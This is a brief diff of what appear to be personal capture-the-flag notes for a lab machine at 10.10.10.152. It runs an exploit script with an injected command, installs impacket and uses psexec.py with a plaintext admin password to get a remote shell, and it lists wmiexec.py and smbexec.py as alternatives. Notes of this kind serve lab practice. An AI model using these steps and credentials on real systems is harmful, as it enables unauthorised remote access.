@@ -124,8 +124,14 @@ get .py
 chmod +X new.sh
 ./new.sh -u http://10.10.10.152 -c "OCTOPUS____"
 
+https://github.com/SecureAuthCorp/impacket
+pip install .
 
 
+psexec.py
+psexec.py prtgadmin:'PrTg@dmin2019'@10.10.10.152                                1 ⨯
 
+also exist (wmiexec.py
+smbexec.py)
 
 
